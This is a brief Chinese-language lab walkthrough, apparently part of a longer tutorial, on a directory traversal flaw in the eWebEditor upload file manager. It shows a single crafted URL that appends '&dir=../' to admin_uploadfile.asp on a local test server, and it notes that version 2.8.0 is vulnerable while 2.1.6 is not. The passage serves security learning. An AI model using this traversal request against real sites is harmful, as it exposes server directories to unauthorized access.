**2）目录遍历**


 

点击"上传文件管理" 然后选择样式目录。
 


 

![img](Eweb编辑器目录遍历漏洞/20170301114431155)
 


 

在id=14后面加上&dir=../


 





```html
http://192.168.87.129:8123/admin_uploadfile.asp?id=14&dir=../
```



![img](Eweb编辑器目录遍历漏洞/20170301114840486)
 


 

发现没有起作用，那就是2.1.6这个版本不存在这个漏洞。换成2.8.0。2.8.0存在这个漏洞


 

![img](Eweb编辑器目录遍历漏洞/20170301120345663)
 


 

能遍历目录。
 


 

![img](Eweb编辑器目录遍历漏洞/20170301120409132)
 


 